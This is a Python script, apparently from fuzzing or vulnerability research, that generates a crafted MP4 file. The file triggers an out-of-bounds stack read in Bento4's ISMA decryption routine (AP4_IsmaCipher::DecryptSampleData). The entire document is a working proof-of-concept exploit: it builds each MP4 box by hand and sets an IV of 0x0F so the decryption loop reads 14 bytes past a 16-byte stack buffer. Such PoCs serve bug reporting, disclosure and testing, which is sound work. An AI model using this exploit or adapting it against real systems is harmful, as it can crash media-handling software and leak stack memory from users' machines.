#!/usr/bin/env python3
"""
VULN-001 PoC generator: Stack Buffer Overread in AP4_IsmaCipher::DecryptSampleData

Triggers CWE-125 (Out-of-bounds Read) in Ap4IsmaCryp.cpp:213-214.

Bug details:
  offset = bso % 16          # = 15 when IV = 0x000000000000000F
  chunk  = offset             # BUG: should be 16 - offset
  for i in range(chunk):
      out[i] = zero_enc[offset + i] ^ in[i]   # zero_enc[15+14] = zero_enc[29] -> OOB

The loop with offset=15 and chunk=15 reads zero_enc[15..29], but zero_enc is only
16 bytes (indices 0-15), so indices 16-29 are 14 bytes of adjacent stack memory.
"""

import struct
import os

OUTPUT_PATH = (
    '/data/ylwang/non-textfuzz/target/_poc/Bento4/'
    'Source_C++_Core_Ap4IsmaCryp_h/vuln_001.mp4'
)

# ---------------------------------------------------------------------------
# Helper functions
# ---------------------------------------------------------------------------

def fourcc(s):
    """Encode a 4-character ASCII string as bytes."""
    return s.encode('latin-1')


def box(type_str, payload):
    """Build a standard box: size(4) + type(4) + payload."""
    size = 8 + len(payload)
    return struct.pack('>I4s', size, fourcc(type_str)) + payload


def full_box(type_str, version, flags, payload):
    """Build a FullBox: size(4) + type(4) + version(1) + flags(3) + payload."""
    size = 12 + len(payload)
    # flags is a 24-bit big-endian value; extract as 3 bytes
    flag_bytes = bytes([(flags >> 16) & 0xFF, (flags >> 8) & 0xFF, flags & 0xFF])
    return struct.pack('>I4sB', size, fourcc(type_str), version) + flag_bytes + payload


# ---------------------------------------------------------------------------
# iSFM atom (ISMA Format, FullBox)
#   selective_encryption = 0  -> bit 7 of first byte = 0
#   key_indicator_length = 0
#   iv_length            = 8
# Total: 12 + 3 = 15 bytes
# ---------------------------------------------------------------------------
isfm_payload = bytes([
    0x00,   # selective_encryption byte (bit7=0 → no selective enc, is_encrypted=true always)
    0x00,   # key_indicator_length
    0x08,   # iv_length = 8
])
isfm = full_box('iSFM', 0, 0, isfm_payload)
assert len(isfm) == 15, f"iSFM size={len(isfm)}, expected 15"

# ---------------------------------------------------------------------------
# schi container box (holds iSFM)
# Total: 8 + 15 = 23 bytes
# ---------------------------------------------------------------------------
schi = box('schi', isfm)
assert len(schi) == 23, f"schi size={len(schi)}, expected 23"

# ---------------------------------------------------------------------------
# frma atom (Original Format Box)
#   original_format = 'mp4a'
# Total: 8 + 4 = 12 bytes
# ---------------------------------------------------------------------------
frma = box('frma', fourcc('mp4a'))
assert len(frma) == 12, f"frma size={len(frma)}, expected 12"

# ---------------------------------------------------------------------------
# schm atom (Scheme Type Box, FullBox, non-short-form: size >= 20)
#   scheme_type    = 'iAEC'  (AP4_PROTECTION_SCHEME_TYPE_IAEC → ISMA decrypter)
#   scheme_version = 0
# Total: 12 + 4 + 4 = 20 bytes  (>= 20 ensures non-short-form parsing)
# ---------------------------------------------------------------------------
schm_payload = fourcc('iAEC') + struct.pack('>I', 0)   # scheme_type + scheme_version
schm = full_box('schm', 0, 0, schm_payload)
assert len(schm) == 20, f"schm size={len(schm)}, expected 20"

# ---------------------------------------------------------------------------
# sinf container box (holds frma + schm + schi)
# Total: 8 + 12 + 20 + 23 = 63 bytes
# ---------------------------------------------------------------------------
sinf = box('sinf', frma + schm + schi)
assert len(sinf) == 63, f"sinf size={len(sinf)}, expected 63"

# ---------------------------------------------------------------------------
# enca sample entry (AudioSampleEntry + sinf child)
#
# AudioSampleEntry fixed fields (28 bytes):
#   reserved[6]          = 0
#   data_reference_index = 1
#   reserved[8]          = 0
#   channelcount         = 2
#   samplesize           = 16
#   pre_defined          = 0
#   reserved             = 0
#   samplerate           = 44100 << 16
# Total: 8 + 28 + 63 = 99 bytes
# ---------------------------------------------------------------------------
enca_audio_fields = (
    b'\x00' * 6                            # reserved (6 bytes)
    + struct.pack('>H', 1)                 # data_reference_index = 1
    + b'\x00' * 8                          # reserved (8 bytes)
    + struct.pack('>H', 2)                 # channelcount = 2
    + struct.pack('>H', 16)               # samplesize = 16
    + struct.pack('>H', 0)                # pre_defined = 0
    + struct.pack('>H', 0)                # reserved = 0
    + struct.pack('>I', 44100 << 16)      # samplerate (16.16 fixed-point)
)
assert len(enca_audio_fields) == 28, f"enca_audio_fields={len(enca_audio_fields)}, expected 28"

enca = box('enca', enca_audio_fields + sinf)
assert len(enca) == 99, f"enca size={len(enca)}, expected 99"

# ---------------------------------------------------------------------------
# stsd FullBox (sample description table)
#   entry_count = 1
# Total: 12 + 4 + 99 = 115 bytes
# ---------------------------------------------------------------------------
stsd = full_box('stsd', 0, 0, struct.pack('>I', 1) + enca)
assert len(stsd) == 115, f"stsd size={len(stsd)}, expected 115"

# ---------------------------------------------------------------------------
# stts FullBox (time-to-sample)
#   1 entry: sample_count=1, sample_delta=1024
# Total: 12 + 4 + 8 = 24 bytes
# ---------------------------------------------------------------------------
stts = full_box('stts', 0, 0, struct.pack('>I', 1) + struct.pack('>II', 1, 1024))
assert len(stts) == 24, f"stts size={len(stts)}, expected 24"

# ---------------------------------------------------------------------------
# stsc FullBox (sample-to-chunk)
#   1 entry: first_chunk=1, samples_per_chunk=1, sample_description_index=1
# Total: 12 + 4 + 12 = 28 bytes
# ---------------------------------------------------------------------------
stsc = full_box('stsc', 0, 0, struct.pack('>I', 1) + struct.pack('>III', 1, 1, 1))
assert len(stsc) == 28, f"stsc size={len(stsc)}, expected 28"

# ---------------------------------------------------------------------------
# stsz FullBox (sample size table)
#   sample_size=0 (variable), sample_count=1
#   entry[0] = 23 (8 bytes IV + 15 bytes payload)
# Total: 12 + 4 + 4 + 4 = 24 bytes
# ---------------------------------------------------------------------------
stsz = full_box('stsz', 0, 0, struct.pack('>II', 0, 1) + struct.pack('>I', 23))
assert len(stsz) == 24, f"stsz size={len(stsz)}, expected 24"

# ---------------------------------------------------------------------------
# stco FullBox (chunk offset)
#   entry_count=1, chunk_offset=TBD (computed below)
# Total: 12 + 4 + 4 = 20 bytes
# ---------------------------------------------------------------------------
# Placeholder; will be rebuilt once the offset is known
stco_placeholder = full_box('stco', 0, 0, struct.pack('>II', 1, 0))
assert len(stco_placeholder) == 20, f"stco size={len(stco_placeholder)}, expected 20"

# ---------------------------------------------------------------------------
# smhd FullBox (sound media header)
# Total: 12 + 4 = 16 bytes
# ---------------------------------------------------------------------------
smhd = full_box('smhd', 0, 0, struct.pack('>HH', 0, 0))
assert len(smhd) == 16, f"smhd size={len(smhd)}, expected 16"

# ---------------------------------------------------------------------------
# dinf / dref / url  boxes
# url  FullBox with flags=1 (self-contained, no URL string needed)
# Total: 12 bytes
# ---------------------------------------------------------------------------
url_box = full_box('url ', 0, 1, b'')
assert len(url_box) == 12, f"url  size={len(url_box)}, expected 12"

dref = full_box('dref', 0, 0, struct.pack('>I', 1) + url_box)
assert len(dref) == 28, f"dref size={len(dref)}, expected 28"

dinf = box('dinf', dref)
assert len(dinf) == 36, f"dinf size={len(dinf)}, expected 36"

# ---------------------------------------------------------------------------
# mdhd FullBox (media header, version 0)
# Total: 12 + 20 = 32 bytes
# ---------------------------------------------------------------------------
mdhd_payload = struct.pack('>IIII', 0, 0, 44100, 1024)  # creation, mod, timescale, duration
mdhd_payload += struct.pack('>HH', 0x55C4, 0)            # language (und=0x55C4), pre_defined
mdhd = full_box('mdhd', 0, 0, mdhd_payload)
assert len(mdhd) == 32, f"mdhd size={len(mdhd)}, expected 32"

# ---------------------------------------------------------------------------
# hdlr FullBox (handler, sound)
# Total: 12 + 21 = 33 bytes
# ---------------------------------------------------------------------------
hdlr_payload = (
    struct.pack('>I', 0)    # pre_defined
    + fourcc('soun')        # handler_type
    + b'\x00' * 12          # reserved (3 x uint32)
    + b'\x00'               # name (empty null-terminated string)
)
assert len(hdlr_payload) == 21, f"hdlr_payload={len(hdlr_payload)}, expected 21"
hdlr = full_box('hdlr', 0, 0, hdlr_payload)
assert len(hdlr) == 33, f"hdlr size={len(hdlr)}, expected 33"

# ---------------------------------------------------------------------------
# Identity matrix for mvhd / tkhd (9 x int32 = 36 bytes)
# ---------------------------------------------------------------------------
IDENTITY_MATRIX = struct.pack('>9i',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)
assert len(IDENTITY_MATRIX) == 36

# ---------------------------------------------------------------------------
# tkhd FullBox (track header, version 0, flags=3: enabled + in-movie)
# Payload = 80 bytes; total = 12 + 80 = 92 bytes
# ---------------------------------------------------------------------------
tkhd_payload = (
    struct.pack('>IIIII', 0, 0, 1, 0, 1024)  # creation, mod, track_id, reserved, duration
    + b'\x00' * 8                              # reserved (2 x uint32)
    + struct.pack('>HHHH', 0, 0, 0x0100, 0)  # layer, alt_group, volume(0x0100=full), reserved
    + IDENTITY_MATRIX                          # matrix (36 bytes)
    + struct.pack('>II', 0, 0)                # width, height (0 for audio)
)
assert len(tkhd_payload) == 80, f"tkhd_payload={len(tkhd_payload)}, expected 80"
tkhd = full_box('tkhd', 0, 3, tkhd_payload)
assert len(tkhd) == 92, f"tkhd size={len(tkhd)}, expected 92"

# ---------------------------------------------------------------------------
# mvhd FullBox (movie header, version 0)
# Payload = 96 bytes; total = 12 + 96 = 108 bytes
# ---------------------------------------------------------------------------
mvhd_payload = (
    struct.pack('>IIIII', 0, 0, 44100, 1024, 0x00010000)  # creation, mod, timescale, dur, rate
    + struct.pack('>H', 0x0100)                              # volume (full)
    + b'\x00' * 10                                           # reserved
    + IDENTITY_MATRIX                                        # matrix (36 bytes)
    + b'\x00' * 24                                          # pre_defined (6 x uint32)
    + struct.pack('>I', 2)                                  # next_track_id
)
assert len(mvhd_payload) == 96, f"mvhd_payload={len(mvhd_payload)}, expected 96"
mvhd = full_box('mvhd', 0, 0, mvhd_payload)
assert len(mvhd) == 108, f"mvhd size={len(mvhd)}, expected 108"

# ---------------------------------------------------------------------------
# Compute the chunk offset
#
# File layout:
#   ftyp:  offset   0, size 16
#   moov:  offset  16, size 568
#   mdat:  offset 584, size 31  (8-byte header + 23 bytes of sample data)
#
# Sample data starts at offset 584 + 8 = 592
# ---------------------------------------------------------------------------
FTYP_SIZE = 16
MOOV_SIZE = 568
MDAT_HEADER_SIZE = 8
CHUNK_OFFSET = FTYP_SIZE + MOOV_SIZE + MDAT_HEADER_SIZE   # = 592

# Rebuild stco with the real offset
stco = full_box('stco', 0, 0, struct.pack('>II', 1, CHUNK_OFFSET))
assert len(stco) == 20, f"stco size={len(stco)}, expected 20"

# ---------------------------------------------------------------------------
# stbl container (sample table)
# Total: 8 + 115 + 24 + 28 + 24 + 20 = 8 + 211 = 219 bytes
# ---------------------------------------------------------------------------
stbl = box('stbl', stsd + stts + stsc + stsz + stco)
assert len(stbl) == 219, f"stbl size={len(stbl)}, expected 219"

# ---------------------------------------------------------------------------
# minf container (media information)
# Total: 8 + 16 + 36 + 219 = 8 + 271 = 279 bytes
# ---------------------------------------------------------------------------
minf = box('minf', smhd + dinf + stbl)
assert len(minf) == 279, f"minf size={len(minf)}, expected 279"

# ---------------------------------------------------------------------------
# mdia container (media)
# Total: 8 + 32 + 33 + 279 = 8 + 344 = 352 bytes
# ---------------------------------------------------------------------------
mdia = box('mdia', mdhd + hdlr + minf)
assert len(mdia) == 352, f"mdia size={len(mdia)}, expected 352"

# ---------------------------------------------------------------------------
# trak container
# Total: 8 + 92 + 352 = 8 + 444 = 452 bytes
# ---------------------------------------------------------------------------
trak = box('trak', tkhd + mdia)
assert len(trak) == 452, f"trak size={len(trak)}, expected 452"

# ---------------------------------------------------------------------------
# moov container
# Total: 8 + 108 + 452 = 8 + 560 = 568 bytes
# ---------------------------------------------------------------------------
moov = box('moov', mvhd + trak)
assert len(moov) == MOOV_SIZE, f"moov size={len(moov)}, expected {MOOV_SIZE}"

# ---------------------------------------------------------------------------
# ftyp box
# Total: 8 + 4 + 4 = 16 bytes
# ---------------------------------------------------------------------------
ftyp = box('ftyp', fourcc('isom') + struct.pack('>I', 0))
assert len(ftyp) == FTYP_SIZE, f"ftyp size={len(ftyp)}, expected {FTYP_SIZE}"

# ---------------------------------------------------------------------------
# mdat box: 8-byte IV + 15 bytes of dummy payload
#
# IV = 0x000000000000000F → bso = 15 → bso%16 = 15 → offset = 15
#
# In DecryptSampleData (Ap4IsmaCryp.cpp):
#   chunk = offset                          # = 15  (BUG: should be 16-offset = 1)
#   for i in range(15):
#       out[i] = zero_enc[15 + i] ^ in[i]  # i=14: zero_enc[29] -- OOB!
#
# Total: 8 + 23 = 31 bytes
# ---------------------------------------------------------------------------
iv_bytes   = struct.pack('>Q', 0x000000000000000F)   # 8 bytes
payload_b  = b'\xAA' * 15                            # 15 bytes (any content)
sample_data = iv_bytes + payload_b
assert len(sample_data) == 23

mdat = box('mdat', sample_data)
assert len(mdat) == 31, f"mdat size={len(mdat)}, expected 31"

# ---------------------------------------------------------------------------
# Assemble the full MP4 file
# ---------------------------------------------------------------------------
mp4_data = ftyp + moov + mdat
assert len(mp4_data) == FTYP_SIZE + MOOV_SIZE + 31, f"total size={len(mp4_data)}"

os.makedirs(os.path.dirname(OUTPUT_PATH), exist_ok=True)
with open(OUTPUT_PATH, 'wb') as f:
    f.write(mp4_data)

print(f"[+] Written {len(mp4_data)} bytes to {OUTPUT_PATH}")
print(f"[+] IV bytes = {iv_bytes.hex()} → bso=15, offset=15, chunk=15")
print(f"[+] OOB read: zero_enc[15+i] for i=0..14 → max index 29 (array is 16 bytes)")
print(f"[+] Chunk offset in stco: {CHUNK_OFFSET}")
